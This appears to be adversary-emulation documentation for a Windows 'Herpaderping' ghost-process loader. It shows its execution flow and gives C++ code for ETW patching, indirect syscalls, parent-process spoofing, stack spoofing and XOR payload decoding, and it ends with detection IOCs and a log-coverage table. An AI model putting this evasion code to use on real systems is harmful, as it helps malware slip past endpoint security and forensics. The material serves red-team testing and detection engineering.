# Process Herpaderping: Ghost Process via SEC_IMAGE Section

## Technique

**MITRE ATT&CK:** T1055 — Process Injection (Herpaderping Variant)

_Herpaderping creates a ghost process by mapping a payload into a memory section and spawning a process from that section. After the process is created but before the thread starts, the on-disk file backing the section is overwritten with junk. The running process therefore has no valid on-disk image — forensic reads of the file see garbage while the process executes from the original in-memory section. This is distinct from Process Doppelgänging (T1055.013), which uses NTFS transactions (TxF) — CWLHerpaderping does **not** use TxF._

## Execution Flow

```
wmain()
 └─ PatchEtw()                         ← B1: suppress ETW (T1562.006) [only if ENABLE_ETW_PATCH defined]
 └─ GetPayloadBuffer()
     ├─ GetFileType(STD_INPUT_HANDLE) → check stdin type
     ├─ MODE 1 (stdin pipe - T1620):
     │   ├─ ReadFile(stdin, 4-byte size)
     │   ├─ VirtualAlloc(size)
     │   └─ ReadFile(stdin, payload)    ← reflective: NO disk file
     └─ MODE 2 (file fallback - T1070.004):
         ├─ CreateFileW(PAYLOAD_PATH)
         ├─ ReadFile → heap buffer
         ├─ [#ifdef ENABLE_PAYLOAD_XOR] XOR decode in-place ← T1027.013
         │     └─ decoded[i] = buf[i] ^ ((0xA3 + i * 0x5B) & 0xFF)
         └─ DeleteFileW(PAYLOAD_PATH)   ← anti-forensic: payload deleted
 └─ Herpaderping(buffer, size)
     ├─ InitSyscallPool / INDIRECT_SYSCALL × 1   ← B2: indirect syscall (NtCreateUserProcess only)
     ├─ SealSyscallPool()               ← flip stub page to PAGE_EXECUTE_READ
     ├─ RtlCreateProcessParametersEx(RuntimeBroker.exe) [GetProcAddress]
     ├─ GetTempFileNameW (prefix "HD") → hTemp
     ├─ WriteFile(payload → hTemp)
     ├─ FlushFileBuffers(hTemp) + CloseHandle(hTemp)
     ├─ GetNonJobParent()               ← B3: PPID spoof (svchost/wininit Session 0)
     ├─ NtCreateUserProcess(ntImagePath, processParameters, PS_ATTRIBUTE_LIST) [StackSpoof]
     │     └─ creates process + suspended thread atomically; no NtCreateSection needed
     ├─ CreateFileW(hTemp, SHARE_READ|SHARE_DELETE) + SetFilePointer(0)
     │   + WriteFile loop  ← overwrite with "Hello From CyberWarFare Labs"
     │   + CloseHandle(hTemp)
     ├─ ResumeThread(hThread)           ← Win32, not spoofed
     └─ DeleteFileW(tempFile)           ← anti-forensic: temp file deleted after resume
```

## Steps Detail

| Step | API / Action | Description |
|------|-------------|-------------|
| 0 | `PatchEtw()` | Patch `ntdll!EtwEventWrite` → `xor eax,eax; ret` — suppress ETW (T1562.006). **Conditional:** only compiled/called when `ENABLE_ETW_PATCH` is defined at build time. |
| 1a | `GetFileType(STD_INPUT_HANDLE)` | Check if stdin is a pipe (reflective mode trigger) |
| 1b-MODE1 | `ReadFile(stdin)` | Read 4-byte size + payload bytes from stdin pipe — **T1620 Reflective Code Loading** (NO disk file) |
| 1b-MODE2 | `CreateFileW` / `ReadFile` | Read payload from `PAYLOAD_PATH` into heap buffer |
| 1c-MODE2 | XOR decode (in-place, conditional) | `decoded[i] = buf[i] ^ ((0xA3 + i * 0x5B) & 0xFF)` — **T1027.013** — only when compiled with `ENABLE_PAYLOAD_XOR`; no-op otherwise |
| 2-MODE2 | `DeleteFileW(PAYLOAD_PATH)` | Delete payload file immediately after read — **T1070.004 File Deletion** |
| 3 | `InitSyscallPool` / `INDIRECT_SYSCALL` × 1 | Resolve SSN for `NtCreateUserProcess` only; `SealSyscallPool()` flips stub page to `PAGE_EXECUTE_READ` |
| 4 | `RtlCreateProcessParametersEx` | Build spoofed `RTL_USER_PROCESS_PARAMETERS` with `ImagePathName = RuntimeBroker.exe` **[GetProcAddress]** |
| 5 | `GetTempFileNameW` / `CreateFileW` | Create temp file in `%TEMP%` with prefix `HD`; write payload bytes via `WriteFile` |
| 6 | `FlushFileBuffers` / `CloseHandle` | Flush and close temp file handle before process creation |
| 7 | `GetNonJobParent()` | Enumerate processes; find `svchost.exe` → fallback `wininit.exe` in Session 0 |
| 8 | `NtCreateUserProcess(ntImagePath, processParameters, attrList)` | Spawn ghost process + suspended thread atomically from temp file path; `PS_ATTRIBUTE_IMAGE_NAME` = NT path of `HD*.tmp`; `PS_ATTRIBUTE_PARENT_PROCESS` = spoofed parent handle **[StackSpoof]** |
| 9 | Temp file overwrite | Reopen `HD*.tmp` with `FILE_SHARE_READ\|FILE_SHARE_DELETE`; `SetFilePointer(0)` + `WriteFile` loop fills file with `L"Hello From CyberWarFare Labs\n"` junk |
| 10 | `ResumeThread(hThread)` | Resume the suspended thread — Win32 call, **not StackSpoofed** |
| 11 | `DeleteFileW(tempFile)` | Delete the overwritten temp file after thread is resumed — **T1070.004 File Deletion** |

> **Key:** `NtCreateUserProcess` is a single higher-level NT API that creates both the process and its initial thread atomically (thread starts suspended). It accepts `processParameters` directly and sets up the PEB internally — no separate `NtCreateSection`, `NtAllocateVirtualMemory`, `NtWriteVirtualMemory`, `WriteProcessMemory`, or `NtCreateThreadEx` calls are needed.

## Patches Applied

### B1 — ETW Patch (`CWLImplant.cpp` line 39–69)

**Purpose:** `EtwEventWrite` in `ntdll.dll` is the function EDR sensors hook to receive kernel-originated ETW events (e.g., `NtCreateUserProcess`). Patching it to `xor eax,eax; ret` suppresses those events for the lifetime of the process.

**Conditional compilation:** The entire `PatchEtw()` function and its call in `main()` are wrapped in `#ifdef ENABLE_ETW_PATCH`. The patch is only active when the binary is built with that preprocessor definition. Without it, ETW suppression is skipped entirely.

```cpp
#ifdef ENABLE_ETW_PATCH
static void PatchEtw()
{
    HMODULE hNtdll = GetNtdllBase();
    PVOID pEtw = RESOLVE_API(hNtdll, EtwEventWrite);
    if (!pEtw) { DBG_PRINT("PatchEtw: EtwEventWrite not resolved, skipping"); return; }
    DWORD old = 0;
    VirtualProtect(pEtw, 4, PAGE_EXECUTE_READWRITE, &old);
    memcpy(pEtw, "\x33\xC0\xC3", 3);  // xor eax,eax; ret
    VirtualProtect(pEtw, 4, old, &old);
}
#endif  // ENABLE_ETW_PATCH
```

When compiled with `ENABLE_ETW_PATCH`, called first in `main()` before any NT API, so DC0021 (OS API Execution) telemetry is suppressed for all subsequent calls.

---

### B2 — Indirect Syscalls (`CWLImplant.cpp` line 359–366, `syscall.h`)

Only **one** injection-critical API uses an indirect syscall stub built at runtime by `InitSyscallPool`:

```cpp
INDIRECT_SYSCALL(_NtCreateUserProcess, pNtCreateUserProcess, NtCreateUserProcess);
SealSyscallPool();  // flip stub page PAGE_RWX → PAGE_EXECUTE_READ
```

Each stub: `mov r10,rcx; mov eax,<SSN>; movabs r11,<gadget>; jmp r11` — the gadget (`syscall;ret`) lives inside `ntdll .text`, so the CPU sees the syscall as originating from `ntdll`, not from the stub page. EDR user-mode hooks in `ntdll` are bypassed.

`NtCreateUserProcess` replaces the entire old chain of `NtCreateSection` → `NtCreateProcessEx` → `NtAllocateVirtualMemory` → `NtWriteVirtualMemory` → `NtCreateThreadEx`. All other APIs (`RtlCreateProcessParametersEx`, `RtlInitUnicodeString`) are resolved via `RESOLVE_API` (EAT-walk `GetProcAddress`), not indirect syscalls.

---

### B3 — PPID Spoofing — `GetNonJobParent()` (`CWLImplant.cpp` line 30–51)

**Purpose:** `NtCreateProcessEx` inherits session and job-object constraints from its parent handle. On IIS servers, the caller may be inside an IIS Job Object. Using a Session 0 non-PPL process as parent places the ghost in Session 0 with no Job Object.

```cpp
static HANDLE GetNonJobParent()
{
    const wchar_t* targets[] = { OBFWSTR(L"svchost.exe"), OBFWSTR(L"wininit.exe"), NULL };
    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnap == INVALID_HANDLE_VALUE) return GetCurrentProcess();
    PROCESSENTRY32W pe = { sizeof(pe) };
    if (Process32FirstW(hSnap, &pe)) {
        do {
            for (int i = 0; targets[i]; i++) {
                if (_wcsicmp(pe.szExeFile, targets[i]) == 0) {
                    DWORD sid = 0xFFFF;
                    ProcessIdToSessionId(pe.th32ProcessID, &sid);
                    if (sid != 0) continue;  // reject Session 1+ (interactive users)
                    HANDLE h = OpenProcess(PROCESS_CREATE_PROCESS, FALSE, pe.th32ProcessID);
                    if (h) { CloseHandle(hSnap); return h; }
                }
            }
        } while (Process32NextW(hSnap, &pe));
    }
    CloseHandle(hSnap);
    return GetCurrentProcess();  // fallback: no spoof
}
```

**Why `svchost.exe` first:** On Windows Server 2022, `wininit.exe` and `services.exe` may restrict `PROCESS_CREATE_PROCESS` even from SYSTEM. `svchost.exe` is non-PPL, always in Session 0, and reliably accessible. `wininit.exe` is the fallback if no `svchost.exe` handle can be opened.

**Note:** `NtCreateUserProcess` inherits the **calling process's** token (not the spoofed parent's), so no separate token fixup is needed.

---

### B4 — Token Fixup — **Removed**

The `NtSetInformationProcess(ProcessAccessToken=9)` token fixup documented in earlier versions is **no longer present in the codebase**. The `_NtSetInformationProcess` typedef is retained in `CWLInc.h` but the function is never called.

`NtCreateUserProcess` inherits the calling process's token by default (unlike `NtCreateProcessEx`, which inherited the spoofed parent's token). Token fixup is therefore unnecessary when using `NtCreateUserProcess`.

> **Impact on Combined Effect table:** The ghost process token now reflects the calling process's context by default, without the explicit fixup step.

---

### B5 — Stack Spoofing (`StackSpoof.cpp` / `StackSpoof.h`)

The `NtCreateUserProcess` indirect syscall call is wrapped with `StackSpoofer`:

```cpp
StackSpoofer spoofer(OBFSTR("kernel32.dll"));
spoofer.Activate();
status = pNtCreateUserProcess(&hProcess, &hThread, ...);
spoofer.Deactivate();
```

`Activate()` plants a fake return address inside `kernel32.dll` on the stack before the syscall. EDR stack-walk inspection sees the call as originating from `kernel32.dll`, not from the stub page or the PE. `ResumeThread` (step 10) is a Win32 call and is **not** stack-spoofed.

---

### B6 — XOR Payload Decode (`CWLImplant.cpp`, `GetPayloadBuffer` Mode 2)

**Purpose:** On-disk payload file is stored XOR-encoded so it does not have a valid MZ header. The binary decodes it in memory before use, preventing static AV from identifying the file as a PE. **T1027.013 — Obfuscated Files or Information: Encrypted/Encoded File.**

**Conditional compilation:** Entire decode block is wrapped in `#ifdef ENABLE_PAYLOAD_XOR`. Without it, the raw file bytes are used directly.

**Applies to Mode 2 only.** Mode 1 (stdin pipe) receives plain PE bytes — no XOR in the pipe path.

```cpp
#ifdef ENABLE_PAYLOAD_XOR
const BYTE PAYLOAD_XOR_BASE = 0xA3;
const BYTE PAYLOAD_XOR_STEP = 0x5B;
for (size_t i = 0; i < p_size; i++)
    bufferAddress[i] ^= (BYTE)((PAYLOAD_XOR_BASE + i * PAYLOAD_XOR_STEP) & 0xFF);
#endif
```

Formula is self-inverse (XOR): encoding and decoding use the same function. First byte: `0x4D ('M') ^ 0xA3 = 0xEE` — the encoded file does not start with `MZ`.

---

### Combined Effect

| Scenario | Ghost PPID | Ghost Session | Ghost Token |
|---|---|---|---|
| No patches | `CertEnrollAgent.exe` | Inherited | Caller token |
| PPID patch (current) | `svchost.exe` | Session 0 | **Caller token** (inherited via `NtCreateUserProcess` — no fixup needed) |

> `NtCreateUserProcess` inherits the **calling process's** token by default. The explicit `NtSetInformationProcess(ProcessAccessToken=9)` fixup (B4) used in earlier versions with `NtCreateProcessEx` is no longer needed or present.

## Payload Loading Modes

### Mode 1: Reflective Loading via Stdin (T1620)

**Trigger:** Parent process spawns `CertEnrollAgent.exe` with stdin pipe redirection

**Example (Node.js):**
```javascript
const result = child_process.spawnSync(
    'C:/ProgramData/CertEnrollAgent.exe',
    [],
    { input: payloadBuffer } // stdin redirected with PE bytes
);
```

**Payload format:** 4-byte little-endian size header + PE file bytes

**Key benefit:** Payload **never written to disk** - loaded directly into memory from pipe

**ATT&CK:** T1620 Reflective Code Loading

### Mode 2: File-based Loading with Deletion (T1070.004)

**Trigger:** Stdin is not a pipe (normal console or file handle)

**Default compile-time path (`CWLImplant.cpp` line 13):**

```cpp
#ifndef PAYLOAD_PATH
#define PAYLOAD_PATH L"C:\\temp\\payload64.exe"
#endif
```

**Override at build time via MSBuild (used in emulation plan):**

```powershell
msbuild CWLHerpaderping.sln /p:Configuration=Release /p:Platform=x64 `
    /p:CustomPayloadPath="C:\\ProgramData\\CertCA.bin" /t:Rebuild /m
```

**Key behavior:** Payload read from disk then **immediately deleted** via `DeleteFileW`

**ATT&CK:** T1070.004 Indicator Removal: File Deletion

**Emulation plan usage:**
- Mode 2 (file-based) is the primary path when spawned by a privilege escalation tool as SYSTEM with no stdin pipe; reads `CertCA.bin` (XOR-decoded if built with `ENABLE_PAYLOAD_XOR`) then deletes it
- Mode 1 (reflective) is the alternate path when parent spawns the binary with `[4-byte LE size][PE bytes]` on stdin

## Payload Requirements

- Format: Portable Executable (.exe), not raw shellcode
- Architecture: x64
- Entry point: Standard PE entry point (`AddressOfEntryPoint`)
- Self-contained: no external DLL dependencies at load time

## IOCs for Detection

### Mode 1 (Reflective Loading) Indicators:
- Parent process spawns the loader with stdin pipe containing `[4-byte LE size][PE bytes]`
- `GetFileType(STD_INPUT_HANDLE)` returns `FILE_TYPE_PIPE` in the loader process
- **No payload file on disk** — payload transferred entirely via pipe
- Process creation event shows stdin redirection

### Mode 2 (File-based) Indicators:
- `CreateFileW` + `ReadFile` on payload path (e.g., `C:\ProgramData\CertCA.bin`)
- `DeleteFileW` called immediately after read - file creation followed by deletion within seconds
- Payload file exists briefly then disappears

### XOR Decode (Mode 2, `ENABLE_PAYLOAD_XOR` only):
- Payload file on disk (`CertCA.bin`) does **not** start with `MZ` (first byte = `0xEE`)
- In-memory payload is a valid PE after decode — discrepancy between on-disk bytes and in-process memory
- `CertCA.bin` → `0xEE` first byte; decoded buffer → `0x4D` (`M`) first byte

### Common Indicators (Both Modes):
- Process whose on-disk image (`HD*.tmp`) contains junk (`Hello From CyberWarFare Labs`) that does not match the in-memory image
- `NtCreateUserProcess` called with `PS_ATTRIBUTE_IMAGE_NAME` pointing to the `HD*.tmp` path and `PS_ATTRIBUTE_PARENT_PROCESS` pointing to `svchost.exe`/`wininit.exe`
- `ProcessParameters.ImagePathName` = `RuntimeBroker.exe` while the actual image loaded is from `HD*.tmp`
- PPID of ghost process resolves to `svchost.exe` or `wininit.exe` in Session 0 despite the real parent being a non-service process
- Stack return address in `kernel32.dll` for the `NtCreateUserProcess` syscall (fake return planted by StackSpoofer)
- `EtwEventWrite` in `ntdll` patched to `xor eax,eax; ret` in calling process memory (only when built with `ENABLE_ETW_PATCH`)
- `HD*.tmp` file created in `%TEMP%`, overwritten with junk, then deleted — all within seconds
- API sequence: `RtlCreateProcessParametersEx(RuntimeBroker.exe)` → `NtCreateUserProcess` (suspended) → temp file overwrite → `ResumeThread` → `DeleteFileW(HD*.tmp)`

## Log Sources Coverage

| Data Component | Log Source | Channel/Event | Notes |
|---|---|---|---|
| Process Creation (DC0032) | WinEventLog:Sysmon | EventCode=1 | ❌ Ghost process — `ImageFileName` shows `RuntimeBroker.exe` but on-disk file is junk |
| Process Access (DC0035) | WinEventLog:Sysmon | EventCode=10 | ✅ Yes — process open events visible for `NtCreateUserProcess` parent handle operations |
| File Creation (DC0016) | WinEventLog:Sysmon | EventCode=11 | ✅ `HD*.tmp` created then immediately overwritten |
| OS API Execution (DC0021) | ETW:Microsoft-Windows-Kernel-Process | `NtCreateUserProcess` | ⚠️ Suppressed only when binary compiled with `ENABLE_ETW_PATCH`; visible otherwise |
| Thread Creation (DC0019) | WinEventLog:Sysmon | EventCode=8 | ❌ No `CreateRemoteThread` — initial thread created inside `NtCreateUserProcess`, resumed via Win32 `ResumeThread` |
